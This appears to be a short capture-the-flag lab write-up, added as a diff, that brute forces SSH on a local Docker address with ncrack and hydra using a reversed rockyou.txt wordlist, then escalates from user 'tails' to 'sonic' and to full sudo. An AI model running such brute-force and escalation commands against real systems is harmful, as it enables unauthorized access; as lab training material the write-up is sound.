@@ -1,0 +1,15 @@
+When we access the webpage, we see the name "tails". We'll use this to brute force the SSH service
+
+ncrack -u tails -P /usr/share/wordlists/rockyou.txt -vv -T 5 ssh://172.17.0.2:22
+
+Unfortunately, the correct password is at the end of the rockyou.txt list
+
+tac /usr/share/wordlists/rockyou.txt | tr -d ' ' > /usr/share/wordlists/reverse_rockyou.txt
+
+hydra -l tails -P /usr/share/wordlists/reverse_rockyou.txt -t 16 172.17.0.2 ssh
+
+When we login, we see that we can use the bash command as the sonic user
+
+Afterwards, we see that, as the sonic user, we can run any commands as sudo
+
+Finis
